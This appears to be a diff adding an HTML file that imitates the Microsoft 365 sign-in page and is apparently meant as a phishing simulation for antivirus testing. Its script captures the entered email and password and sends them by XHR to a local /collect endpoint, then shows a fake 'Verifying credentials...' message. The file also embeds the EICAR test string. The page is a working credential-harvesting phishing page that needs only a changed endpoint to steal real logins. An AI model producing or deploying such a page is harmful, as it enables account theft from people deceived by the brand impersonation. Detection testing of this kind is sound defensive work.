@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 - Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .login-container { background: #fff; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
+        .logo { width: 108px; margin-bottom: 16px; }
+        .logo-text { font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 4px; }
+        .subtitle { color: #666; font-size: 13px; margin-bottom: 24px; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 6px 10px; margin-bottom: 16px; border: 1px solid #666; font-size: 15px; outline: none; }
+        input:focus { border-color: #0067b8; }
+        .submit-btn { background: #0067b8; color: #fff; border: none; padding: 8px 40px; font-size: 15px; cursor: pointer; float: right; }
+        .submit-btn:hover { background: #005a9e; }
+        .forgot { color: #0067b8; font-size: 13px; text-decoration: none; display: block; margin-bottom: 16px; }
+        .footer { margin-top: 24px; font-size: 12px; color: #666; clear: both; }
+        /* AV-Unitest: Embedded test strings to trigger content scanning */
+        /* X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* */
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo-text">Microsoft</div>
+        <p class="subtitle">Sign in to your account</p>
+        <form id="login-form" method="POST" action="#">
+            <input type="text" name="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <a href="#" class="forgot">Forgot password?</a>
+            <button type="submit" class="submit-btn">Sign in</button>
+        </form>
+        <div class="footer">
+            <p>No account? <a href="#" style="color:#0067b8;">Create one!</a></p>
+        </div>
+    </div>
+    <script>
+        // AV-Unitest phishing simulation payload
+        // This script simulates credential exfiltration for AV detection testing
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var u = document.querySelector('input[name="username"]').value;
+            var p = document.querySelector('input[name="password"]').value;
+            // Simulated exfiltration via XMLHttpRequest (XHR) to trigger AV heuristics
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://127.0.0.1:4444/collect', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({user: u, pass: p, ts: Date.now()}));
+            } catch(err) {}
+            // Simulated redirect
+            document.body.innerHTML = '<h2 style="text-align:center;margin-top:40vh;">Verifying credentials...</h2>';
+        });
+        // Additional heuristic trigger strings (obfuscated EICAR fragments)
+        var _t1 = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}';
+        var _t2 = '$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
+        var _payload = _t1 + _t2;
+    </script>
+</body>
+</html>
